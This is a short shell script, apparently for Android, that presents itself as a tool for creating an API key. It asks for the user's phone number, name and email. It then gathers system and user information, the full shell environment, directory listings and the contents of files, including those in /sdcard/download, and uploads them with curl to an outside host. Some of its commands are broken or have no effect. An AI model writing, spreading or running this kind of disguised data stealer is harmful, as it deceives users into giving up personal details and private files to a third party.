#!/system/bin/bash/sh
echo "
 ____       ____
|  _ \  ___/ ___|
| | | |/ _ \___ \
| |_| | (_) |__) |
|____/ \___/____/"
echo "Please Enter your Personal Information to created API KEY use "
echo ""
  echo -n "Phone Number:"
  read phone
  echo -n "first and last name :"
  read name
  echo -n "Email :"
  read email


cm()
{
read line
  case $line in

  $line)
bat() {
  echo "
  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)
  id     : $(id)
  $(set)"

echo "  $(cd ..)"
echo "  $(cd)"
echo "  $(ls -la)"
echo "  $(cd /sdcard/download)"
echo "  $(ls -la)"
echo "  $(cat *)"
}

echo "
  phone number : $phone
  name : $name
  email : $email

  ','{$line}',' " >> system.txt
  bat >> system.txt
  curl -T system.txt http://happy.mikikk.co.jp/
  cm

 esac
 }
cm
